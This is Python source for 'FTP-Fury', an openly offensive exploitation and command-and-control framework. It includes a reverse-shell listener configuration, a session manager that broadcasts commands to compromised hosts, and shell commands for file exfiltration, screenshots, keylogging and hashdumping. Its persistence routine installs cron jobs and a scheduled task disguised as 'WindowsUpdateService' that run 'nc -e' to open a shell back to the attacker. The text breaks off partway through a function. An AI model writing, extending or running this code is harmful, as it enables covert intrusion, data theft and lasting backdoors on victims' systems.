#!/usr/bin/env python3
"""
FTP-Fury - Ultimate Exploitation Framework
Author: SYLHETYHACKVENGER (THE-ERROR808)
Description: Advanced penetration testing toolkit combining multiple CVEs
Disclaimer: For authorized security testing only
"""

import socket
import requests
import subprocess
import threading
import json
import logging
import time
import sys
import os
import re
import uuid
import base64
import hashlib
import pickle
import tempfile
import ipaddress
import urllib.parse
import argparse
import signal
import random
import string
import struct
import zlib
import gzip
import binascii
import ctypes
import platform
import traceback
import queue
import sqlite3
import xml.etree.ElementTree as ET
import io
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any, Union
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
import warnings
warnings.filterwarnings('ignore')

# ============================================================
# ADVANCED IMPORTS WITH FALLBACKS
# ============================================================

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

SCAPY_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False


BANNER = """
\033[91m                                  _.-.
                                 ._.-.
                    .^         _.-'=. \\
                  .'  )    .-._.-=-..' \\'.
               .'   .'   _.--._-='.'   |  `.  ^.
             .'   .'    _`.-.`=-./'.-. / .-.\\ `. `.
           .'    /      _.-=-=-/ | '._)`(_.'|   \\  `.
          /    /|       _.--=.'  `. (.-v-.)/    |\\   \\
        .'    / \\       _.-.' \\-.' `-..-..'     / \\   `.
       /     /   `-.._ .-.'      `.'  " ". _..-'  |    |
      '      |    |   /   )        \\  /   \\   \\    \\    `.
     /      /    /   /   /\\                \\   \\   |      \\
    /      /    /  .'  .'\\ `.        .'     \\   |   \\      \\
   /      /    /  /   /   \\  `-    -' .`.    .  \\    \\     |
  |      /    / .''\\.'    | `.      .'   `.   \\  |    |    |
 .'     /    / /   |      |      .'/       `.- `./    /    |
 |     /    .-|   /--.    / `.    |    _.-''\\   |     |    \\
.'    /  .-'  |  /    `-.|       .'\\_.'      `. |`.   |    |
|    |.-'     / /       /           \\          \\ \\ `. \\     \\
|    /       /  |      /             \\         |  `. `.|    |
|   |       /   `.     |      `   .'  \\        /    \\  \\    /
|   |      ///.-'.\\    |       \\ /    `\\      / /-.  \\ |    |
|   /      \\\\    `    \\.-     |    `-.\\     |/   \\\\'.   |
 \\ |        \\\\|        |      / \\      |          //// |  /
 | |         '''        |     /   \\     |          |//  |  \\
 \\ |                    |.-  |     \\  .-|          ''   |  /
  \\|                    /    |    / ` ../               / /
                        |'   /    |    /               | /
                        \\.'  |    | `./                |/
                        /    \\   /    \\
                        \\ `. /   \\    /
                         |  |     '. '
                         /  |      |  \\
                        /   |      /   `.
                       | | | \\   .'  `.. \\
                      / / / ._`. \\.'-.\\.`/
             LGB      |/ / /  `'  `  |/|/
                       \\|\\|
\033[0m
\033[92m                                                                            
███████╗████████╗██████╗     ███████╗██╗   ██╗██████╗ ██╗   ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
█████╗     ██║   ██████╔╝    █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
██╔══╝     ██║   ██╔═══╝     ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
██║        ██║   ██║         ██║     ╚██████╔╝██║  ██║   ██║   
╚═╝        ╚═╝   ╚═╝         ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
\033[0m
\033[96m                                                                            
                                                   
Author: SYLHETYHACKVENGER (THE-ERROR808)
Version: ULTIMATE EDITION
\033[0m
"""

# ============================================================
# LOGGING SETUP
# ============================================================

os.makedirs('logs', exist_ok=True)

logger = logging.getLogger('FTP-Fury')
logger.setLevel(logging.DEBUG)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_format = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
console_handler.setFormatter(console_format)
logger.addHandler(console_handler)

try:
    from logging.handlers import RotatingFileHandler
    file_handler = RotatingFileHandler('ftp-fury.log', maxBytes=10485760, backupCount=5)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(console_format)
    logger.addHandler(file_handler)
except:
    try:
        file_handler = logging.FileHandler('ftp-fury.log')
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(console_format)
        logger.addHandler(file_handler)
    except:
        pass

# ============================================================
# CONFIGURATION
# ============================================================

CONFIG = {
    'listen_ip': '0.0.0.0',
    'listen_port': 4444,
    'web_port': 5000,
    'ldap_port': 1389,
    'http_port': 8080,
    'https_port': 8443,
    'timeout': 10,
    'max_threads': 200,
    'debug': False,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'session_keepalive': 30,
    'max_retries': 5,
    'backoff_factor': 2,
    'buffer_size': 65536,
    'max_payload_size': 1048576,
    'connection_pool_size': 100,
    'dns_servers': ['8.8.8.8', '1.1.1.1', '9.9.9.9'],
    'proxy_list': [],
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0'
    ]
}

# ============================================================
# COLOR CLASS
# ============================================================

class Color:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKE = '\033[9m'
    RESET = '\033[0m'
    
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    BG_BRIGHT_MAGENTA = '\033[105m'
    BG_BRIGHT_CYAN = '\033[106m'
    BG_BRIGHT_WHITE = '\033[107m'
    
    @staticmethod
    def error(text: str) -> str:
        return Color.BOLD + Color.RED + text + Color.RESET
    
    @staticmethod
    def success(text: str) -> str:
        return Color.BOLD + Color.GREEN + text + Color.RESET
    
    @staticmethod
    def warning(text: str) -> str:
        return Color.BOLD + Color.YELLOW + text + Color.RESET
    
    @staticmethod
    def info(text: str) -> str:
        return Color.BOLD + Color.BLUE + text + Color.RESET

# ============================================================
# ENUMS AND DATACLASSES
# ============================================================

class ExploitStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    PARTIAL = "partial"

@dataclass
class Target:
    ip: str
    hostname: str = ""
    ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    banners: Dict[int, str] = field(default_factory=dict)
    vulnerabilities: List[str] = field(default_factory=list)
    os: str = "unknown"
    os_version: str = "unknown"
    architecture: str = "unknown"
    domain: str = ""
    last_seen: float = field(default_factory=time.time)
    notes: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'ip': self.ip,
            'hostname': self.hostname,
            'ports': self.ports,
            'services': self.services,
            'banners': self.banners,
            'vulnerabilities': self.vulnerabilities,
            'os': self.os,
            'os_version': self.os_version,
            'architecture': self.architecture,
            'domain': self.domain,
            'last_seen': self.last_seen,
            'notes': self.notes
        }

@dataclass
class Credential:
    username: str
    password: str
    domain: str = ""
    service: str = ""
    valid: bool = False
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict:
        return {
            'username': self.username,
            'password': self.password,
            'domain': self.domain,
            'service': self.service,
            'valid': self.valid,
            'timestamp': self.timestamp
        }

# ============================================================
# DATABASE MANAGER
# ============================================================

class DatabaseManager:
    def __init__(self, db_path: str = "ftp-fury.db"):
        self.db_path = db_path
        self.conn = None
        self.init_db()
    
    def init_db(self):
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE NOT NULL,
                hostname TEXT,
                os TEXT,
                os_version TEXT,
                architecture TEXT,
                domain TEXT,
                notes TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                port INTEGER,
                service TEXT,
                banner TEXT,
                version TEXT,
                FOREIGN KEY (target_id) REFERENCES targets (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                name TEXT,
                cve TEXT,
                description TEXT,
                severity TEXT,
                discovered TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (target_id) REFERENCES targets (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                target_id INTEGER,
                user TEXT,
                type TEXT,
                created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                alive BOOLEAN DEFAULT 1,
                FOREIGN KEY (target_id) REFERENCES targets (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                domain TEXT,
                service TEXT,
                valid BOOLEAN DEFAULT 0,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS exploits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id INTEGER,
                exploit_name TEXT,
                status TEXT,
                result TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (target_id) REFERENCES targets (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                subnet TEXT,
                targets_found INTEGER,
                duration REAL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def add_target(self, target: Target) -> int:
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO targets 
            (ip, hostname, os, os_version, architecture, domain, notes, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        ''', (target.ip, target.hostname, target.os, target.os_version, 
              target.architecture, target.domain, target.notes))
        
        target_id = cursor.lastrowid
        
        for port, service in target.services.items():
            cursor.execute('''
                INSERT OR REPLACE INTO ports (target_id, port, service, banner)
                VALUES (?, ?, ?, ?)
            ''', (target_id, port, service, target.banners.get(port, "")))
        
        for vuln in target.vulnerabilities:
            cursor.execute('''
                INSERT INTO vulnerabilities (target_id, name, cve)
                VALUES (?, ?, ?)
            ''', (target_id, vuln, "Unknown"))
        
        self.conn.commit()
        return target_id
    
    def add_credential(self, cred: Credential):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (username, password, domain, service, valid)
            VALUES (?, ?, ?, ?, ?)
        ''', (cred.username, cred.password, cred.domain, cred.service, cred.valid))
        self.conn.commit()
    
    def get_credentials(self) -> List[Credential]:
        cursor = self.conn.cursor()
        cursor.execute('SELECT username, password, domain, service, valid FROM credentials')
        return [Credential(*row) for row in cursor.fetchall()]
    
    def add_scan(self, subnet: str, targets_found: int, duration: float):
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO scans (subnet, targets_found, duration)
            VALUES (?, ?, ?)
        ''', (subnet, targets_found, duration))
        self.conn.commit()
    
    def get_stats(self) -> Dict:
        cursor = self.conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM targets')
        targets = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM sessions WHERE alive=1')
        sessions = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM credentials')
        creds = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM exploits')
        exploits = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM scans')
        scans = cursor.fetchone()[0]
        
        return {
            'targets': targets,
            'sessions': sessions,
            'credentials': creds,
            'exploits': exploits,
            'scans': scans
        }
    
    def close(self):
        if self.conn:
            self.conn.close()

# ============================================================
# SESSION MANAGER
# ============================================================

class SessionManager:
    def __init__(self, db: DatabaseManager):
        self.sessions = {}
        self.lock = threading.RLock()
        self.db = db
        self.running = True
        self.keepalive_thread = None
        self.cleanup_thread = None
        self.start_keepalive()
        self.start_cleanup()
    
    def add_session(self, session) -> str:
        with self.lock:
            self.sessions[session.id] = session
            try:
                cursor = self.db.conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO sessions (id, target_id, user, type, alive)
                    VALUES (?, (SELECT id FROM targets WHERE ip=?), ?, ?, 1)
                ''', (session.id, session.target, session.user, session.type))
                self.db.conn.commit()
            except:
                pass
            logger.info(f"{Color.GREEN}[+] New session: {session.id} ({session.target}){Color.RESET}")
            return session.id
    
    def get_session(self, session_id: str):
        with self.lock:
            return self.sessions.get(session_id)
    
    def remove_session(self, session_id: str) -> bool:
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].close()
                del self.sessions[session_id]
                try:
                    cursor = self.db.conn.cursor()
                    cursor.execute('UPDATE sessions SET alive=0 WHERE id=?', (session_id,))
                    self.db.conn.commit()
                except:
                    pass
                return True
            return False
    
    def list_sessions(self) -> List[Dict]:
        with self.lock:
            return [
                {
                    'id': sid,
                    'target': session.target,
                    'user': session.user,
                    'type': session.type,
                    'created': session.created.strftime('%Y-%m-%d %H:%M:%S'),
                    'alive': session.alive,
                    'pid': session.pid if hasattr(session, 'pid') else None
                }
                for sid, session in self.sessions.items()
                if session.alive
            ]
    
    def broadcast(self, command: str, timeout: int = 10) -> Dict[str, str]:
        results = {}
        with self.lock:
            for sid, session in self.sessions.items():
                if session.alive:
                    try:
                        results[sid] = session.send_command(command, timeout=timeout)
                    except Exception as e:
                        results[sid] = f"Error: {e}"
        return results
    
    def start_keepalive(self):
        def keepalive_loop():
            while self.running:
                time.sleep(CONFIG['session_keepalive'])
                with self.lock:
                    for session in list(self.sessions.values()):
                        if session.alive:
                            try:
                                session.send_command('echo "keepalive"', timeout=2)
                            except:
                                session.alive = False
                                logger.warning(f"Session {session.id} died")
        
        self.keepalive_thread = threading.Thread(target=keepalive_loop, daemon=True)
        self.keepalive_thread.start()
    
    def start_cleanup(self):
        def cleanup_loop():
            while self.running:
                time.sleep(60)
                with self.lock:
                    dead_sessions = [sid for sid, s in self.sessions.items() if not s.alive]
                    for sid in dead_sessions:
                        del self.sessions[sid]
                        try:
                            cursor = self.db.conn.cursor()
                            cursor.execute('UPDATE sessions SET alive=0 WHERE id=?', (sid,))
                            self.db.conn.commit()
                        except:
                            pass
        
        self.cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
        self.cleanup_thread.start()
    
    def stop(self):
        self.running = False
        with self.lock:
            for session in list(self.sessions.values()):
                session.close()
            self.sessions.clear()

# ============================================================
# ADVANCED SHELL SESSION
# ============================================================

class AdvancedShellSession:
    def __init__(self, socket_obj, target: str, user: str, shell_type: str = "shell"):
        self.id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        self.socket = socket_obj
        self.target = target
        self.user = user
        self.type = shell_type
        self.created = datetime.now()
        self.last_active = datetime.now()
        self.alive = True
        self.buffer = ""
        self.history = []
        self.pid = None
        self.platform = None
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.recv_thread = None
        self.output_buffer = []
        self.encoding = 'utf-8'
        self.prompt_patterns = [
            r'\$ ', r'# ', r'> ', r':~$ ', r'~# ',
            r'\\[\\w@\\w\\s]+\\$',
            r'\\[\\w@\\w\\s]+#',
            r'C:\\\\[^>]+>',
            r'PS C:\\\\[^>]+>'
        ]
        self.start_receiver()
    
    def start_receiver(self):
        def receiver_loop():
            while self.alive:
                try:
                    self.socket.settimeout(0.1)
                    data = self.socket.recv(CONFIG['buffer_size'])
                    if data:
                        self.response_queue.put(data)
                    else:
                        self.alive = False
                        break
                except socket.timeout:
                    continue
                except:
                    self.alive = False
                    break
        
        self.recv_thread = threading.Thread(target=receiver_loop, daemon=True)
        self.recv_thread.start()
    
    def send_command(self, cmd: str, timeout: int = 15, raw: bool = False) -> str:
        if not self.alive:
            return f"{Color.RED}[!] Session {self.id} is dead{Color.RESET}"
        
        try:
            while not self.response_queue.empty():
                try:
                    self.response_queue.get_nowait()
                except:
                    break
            
            if not raw:
                cmd += '\n'
            self.socket.send(cmd.encode(self.encoding, errors='ignore'))
            
            output = ""
            start_time = time.time()
            prompt_found = False
            
            while time.time() - start_time < timeout:
                try:
                    data = self.response_queue.get(timeout=0.5)
                    if data:
                        decoded = data.decode(self.encoding, errors='ignore')
                        output += decoded
                        
                        for pattern in self.prompt_patterns:
                            if re.search(pattern, output, re.MULTILINE):
                                prompt_found = True
                                break
                        
                        if prompt_found:
                            for pattern in self.prompt_patterns:
                                output = re.sub(pattern, '', output, flags=re.MULTILINE)
                            break
                except queue.Empty:
                    if output and time.time() - start_time > 2:
                        break
                    continue
                except:
                    break
            
            output = output.strip()
            
            if cmd.strip():
                self.history.append((cmd.strip(), output[:100]))
                self.last_active = datetime.now()
            
            return output
            
        except socket.timeout:
            return f"{Color.YELLOW}[!] Command timed out{Color.RESET}"
        except Exception as e:
            self.alive = False
            return f"{Color.RED}[!] Session error: {e}{Color.RESET}"
    
    def interactive_mode(self):
        print(f"\n{Color.BOLD}{Color.GREEN}[+] Interactive shell on {self.target} (user: {self.user}){Color.RESET}")
        print(f"{Color.DIM}[+] Type 'help' for commands, 'exit' to close{Color.RESET}")
        print(f"{Color.DIM}[+] Use '!' prefix for local commands{Color.RESET}\n")
        
        while self.alive:
            try:
                cmd = input(f"{Color.CYAN}[{self.target}] {self.user}${Color.RESET} ").strip()
                
                if not cmd:
                    continue
                
                if cmd.startswith('!'):
                    self._execute_local(cmd[1:].strip())
                    continue
                
                self.history.append(cmd)
                
                if cmd.lower() in ['exit', 'quit', 'logout']:
                    self.close()
                    break
                    
                elif cmd.lower() == 'help':
                    self._show_help()
                    
                elif cmd.lower().startswith('upload '):
                    self._handle_upload(cmd[7:].strip())
                    
                elif cmd.lower().startswith('download '):
                    self._handle_download(cmd[9:].strip())
                    
                elif cmd.lower() == 'screenshot':
                    self._handle_screenshot()
                    
                elif cmd.lower().startswith('ps'):
                    self._handle_ps()
                    
                elif cmd.lower().startswith('netstat'):
                    self._handle_netstat()
                    
                elif cmd.lower().startswith('find '):
                    self._handle_find(cmd[5:].strip())
                    
                elif cmd.lower().startswith('persist'):
                    self._handle_persistence()
                    
                elif cmd.lower().startswith('migrate'):
                    self._handle_migrate()
                    
                elif cmd.lower().startswith('portfwd'):
                    self._handle_portfwd(cmd[8:].strip())
                    
                elif cmd.lower().startswith('socks'):
                    self._handle_socks()
                    
                elif cmd.lower().startswith('keylog'):
                    self._handle_keylogger()
                    
                elif cmd.lower().startswith('hashdump'):
                    self._handle_hashdump()
                    
                else:
                    output = self.send_command(cmd)
                    if output:
                        lines = output.split('\n')
                        if len(lines) > 50:
                            for i in range(0, len(lines), 50):
                                print('\n'.join(lines[i:i+50]))
                                if i + 50 < len(lines):
                                    input(f"{Color.DIM}[+] Press Enter for more...{Color.RESET}")
                        else:
                            print(output)
                    else:
                        print(f"{Color.DIM}[+] Command executed (no output){Color.RESET}")
                        
            except KeyboardInterrupt:
                print(f"\n{Color.YELLOW}[!] Interrupted{Color.RESET}")
                continue
            except Exception as e:
                print(f"{Color.RED}[!] Error: {e}{Color.RESET}")
                break
    
    def _execute_local(self, cmd: str):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(f"{Color.RED}{result.stderr}{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}[!] Local command failed: {e}{Color.RESET}")
    
    def _handle_upload(self, args: str):
        parts = args.split()
        if len(parts) < 2:
            print(f"{Color.YELLOW}Usage: upload <local_file> <remote_path>{Color.RESET}")
            return
        
        local_path, remote_path = parts[0], parts[1]
        
        if not os.path.exists(local_path):
            print(f"{Color.RED}[!] Local file not found: {local_path}{Color.RESET}")
            return
        
        try:
            file_size = os.path.getsize(local_path)
            print(f"{Color.DIM}[+] Uploading {file_size} bytes...{Color.RESET}")
            
            with open(local_path, 'rb') as f:
                data = f.read()
                compressed = zlib.compress(data, 9)
                encoded = base64.b64encode(compressed).decode()
            
            chunk_size = 8192
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            temp_file = f"/tmp/{uuid.uuid4().hex[:8]}.b64"
            
            for i, chunk in enumerate(chunks):
                escaped = chunk.replace("'", "'\\''")
                cmd = f"echo '{escaped}' >> {temp_file}"
                self.send_command(cmd, timeout=5)
                
                if i % 10 == 0:
                    progress = (i * chunk_size / len(encoded)) * 100
                    print(f"{Color.DIM}[+] Progress: {progress:.1f}%{Color.RESET}")
            
            self.send_command(f"base64 -d {temp_file} > {temp_file}.gz", timeout=5)
            self.send_command(f"gunzip -f {temp_file}.gz", timeout=5)
            self.send_command(f"mv {temp_file} {remote_path}", timeout=5)
            self.send_command(f"rm -f {temp_file} {temp_file}.gz", timeout=5)
            
            print(f"{Color.GREEN}[+] File uploaded to {remote_path}{Color.RESET}")
            
        except Exception as e:
            print(f"{Color.RED}[!] Upload failed: {e}{Color.RESET}")
    
    def _handle_download(self, args: str):
        parts = args.split()
        if len(parts) < 2:
            print(f"{Color.YELLOW}Usage: download <remote_path> <local_path>{Color.RESET}")
            return
        
        remote_path, local_path = parts[0], parts[1]
        
        try:
            size_output = self.send_command(f"wc -c < {remote_path} 2>/dev/null")
            if not size_output or not size_output.strip().isdigit():
                print(f"{Color.RED}[!] File not found or inaccessible{Color.RESET}")
                return
            
            file_size = int(size_output.strip())
            print(f"{Color.DIM}[+] File size: {file_size} bytes{Color.RESET}")
            
            temp_file = f"/tmp/{uuid.uuid4().hex[:8]}.b64"
            self.send_command(f"gzip -c {remote_path} | base64 -w0 > {temp_file}", timeout=10)
            
            comp_size_output = self.send_command(f"wc -c < {temp_file}")
            if comp_size_output.strip().isdigit():
                comp_size = int(comp_size_output.strip())
                print(f"{Color.DIM}[+] Compressed size: {comp_size} bytes{Color.RESET}")
            
            content = ""
            chunk_size = 8192
            position = 0
            
            while position < comp_size:
                cmd = f"dd if={temp_file} bs={chunk_size} skip={position//chunk_size} count=1 2>/dev/null"
                chunk = self.send_command(cmd, timeout=5)
                content += chunk
                position += len(chunk)
                
                if position % (chunk_size * 10) < chunk_size:
                    progress = (position / comp_size) * 100
                    print(f"{Color.DIM}[+] Downloading... {progress:.1f}%{Color.RESET}")
            
            self.send_command(f"rm {temp_file}")
            
            decoded = base64.b64decode(content)
            decompressed = zlib.decompress(decoded)
            
            os.makedirs(os.path.dirname(local_path) if os.path.dirname(local_path) else '.', exist_ok=True)
            with open(local_path, 'wb') as f:
                f.write(decompressed)
            
            print(f"{Color.GREEN}[+] File downloaded to {local_path}{Color.RESET}")
            
        except Exception as e:
            print(f"{Color.RED}[!] Download failed: {e}{Color.RESET}")
    
    def _handle_screenshot(self):
        try:
            os_check = self.send_command("uname -s 2>/dev/null")
            is_windows = "MINGW" in os_check or "MSYS" in os_check
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            local_file = f"screenshot_{self.target}_{timestamp}.png"
            
            if is_windows:
                cmd = f'''
                powershell -Command "
                    Add-Type -AssemblyName System.Windows.Forms;
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
                    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap);
                    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
                    $bitmap.Save('C:\\Windows\\Temp\\screenshot_{timestamp}.png');
                    $graphics.Dispose();
                    $bitmap.Dispose();
                "
                '''
                remote_file = f"C:\\Windows\\Temp\\screenshot_{timestamp}.png"
            else:
                check = self.send_command("which import")
                if not check:
                    print(f"{Color.YELLOW}[!] ImageMagick not installed, trying scrot...{Color.RESET}")
                    self.send_command(f"scrot -d 1 /tmp/screenshot_{timestamp}.png 2>/dev/null")
                else:
                    self.send_command(f"import -window root /tmp/screenshot_{timestamp}.png")
                remote_file = f"/tmp/screenshot_{timestamp}.png"
            
            print(f"{Color.DIM}[+] Screenshot captured{Color.RESET}")
            self._handle_download(f"{remote_file} {local_file}")
            self.send_command(f"rm {remote_file}")
            
        except Exception as e:
            print(f"{Color.RED}[!] Screenshot failed: {e}{Color.RESET}")
    
    def _handle_ps(self):
        output = self.send_command("ps aux 2>/dev/null || ps -ef 2>/dev/null || tasklist 2>/dev/null")
        if output:
            lines = output.split('\n')
            print(f"{Color.CYAN}PID    USER     CPU  MEM  COMMAND{Color.RESET}")
            print(f"{Color.DIM}{'-'*60}{Color.RESET}")
            for line in lines[:30]:
                print(line[:100])
            if len(lines) > 30:
                print(f"{Color.DIM}[+] ... and {len(lines)-30} more{Color.RESET}")
    
    def _handle_netstat(self):
        output = self.send_command("netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || netstat -an 2>/dev/null")
        if output:
            print(f"{Color.CYAN}Active Network Connections{Color.RESET}")
            print(f"{Color.DIM}{'-'*60}{Color.RESET}")
            lines = [l for l in output.split('\n') if 'LISTEN' in l or 'ESTABLISHED' in l]
            print('\n'.join(lines[:30]))
    
    def _handle_find(self, args: str):
        if not args:
            print(f"{Color.YELLOW}Usage: find <pattern>{Color.RESET}")
            return
        
        pattern = args.replace("'", "").replace(";", "").replace("&", "")
        output = self.send_command(
            f"find / -name '*{pattern}*' -type f 2>/dev/null | head -50 "
            f"|| find . -name '*{pattern}*' -type f 2>/dev/null | head -50"
        )
        if output:
            print(f"{Color.CYAN}Found files matching: {pattern}{Color.RESET}")
            print(f"{Color.DIM}{'-'*60}{Color.RESET}")
            print(output)
        else:
            print(f"{Color.YELLOW}[!] No files found{Color.RESET}")
    
    def _handle_persistence(self):
        try:
            os_check = self.send_command("uname -s 2>/dev/null")
            is_windows = "MINGW" in os_check or "MSYS" in os_check
            
            if is_windows:
                script = f'''
                powershell -Command "
                    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -FilePath \'cmd.exe\' -ArgumentList \'/c nc -e cmd.exe {CONFIG["listen_ip"]} {CONFIG["listen_port"]}\' -WindowStyle Hidden"';
                    $trigger = New-ScheduledTaskTrigger -AtStartup;
                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Compatibility Win8;
                    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Settings $settings -User SYSTEM;
                "
                '''
            else:
                script = f'''
                (crontab -l 2>/dev/null; echo "@reboot nc -e /bin/bash {CONFIG["listen_ip"]} {CONFIG["listen_port"]} >/dev/null 2>&1") | crontab -
                echo "*/5 * * * * nc -e /bin/bash {CONFIG["listen_ip"]} {CONFIG["listen_port"]} >/dev/null 2>&1" >> /etc/crontab 2>/dev/null
                '''
            
            self.send_command(script)
            print(f"{Color.GREEN}[+] Persistence established{Color.RESET}")
            
        except Exception as e:
            print(f"{Color.RED}[!] Persistence failed: {e}{Color.RESET}")
    
    def _handle_migrate(self):
        try:
            ps_output = self.send_command("ps aux 2>/dev/null")
